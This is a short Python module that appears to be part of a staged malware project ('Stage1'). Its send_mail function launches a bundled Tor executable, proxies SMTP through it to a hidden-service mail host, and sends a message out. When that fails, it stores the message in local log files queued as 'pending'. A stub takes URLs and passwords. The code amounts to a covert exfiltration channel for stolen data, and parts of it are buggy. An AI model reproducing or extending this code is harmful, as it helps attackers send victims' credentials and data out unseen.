import Stage1.GlobalVariables as var
import Stage1.Download as Download
import smtplib
from time import strftime, gmtime
import socks
import os
import subprocess
from threading import Timer


def log(url, pwd):
    pass


def send_mail(process, email, password, message):
    try:
        subprocess.run([var.nt_format(var.tor_root) + "tor.exe"], shell=False)
        #os.system(var.nt_format(var.tor_root) + "explorer.exe")
        socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
        s = socks.wrap_module(smtplib)
        server = smtplib.SMTP(host="torbox3uiot6wchz.onion", port=25)
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        return True
    except ConnectionError:
        try:
            Download.mk_dir(var.log_roots)
            with open(var.nt_format(var.log_root) + process+"_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()), "wb") as msg:
                msg.write(message)
                msg.close()
                try:
                    with open(var.nt_format(var.log_root) + "pending", "w") as f:
                        f.write(var.log_root + process + "_" + strftime("%Y-%m-%d_%H-%M-%S", gmtime()) + "\n")
                        f.close()
                        return True
                except:
                    return False

        except:
            return False


if __name__ == "__main__":
    __name__ = "Log"
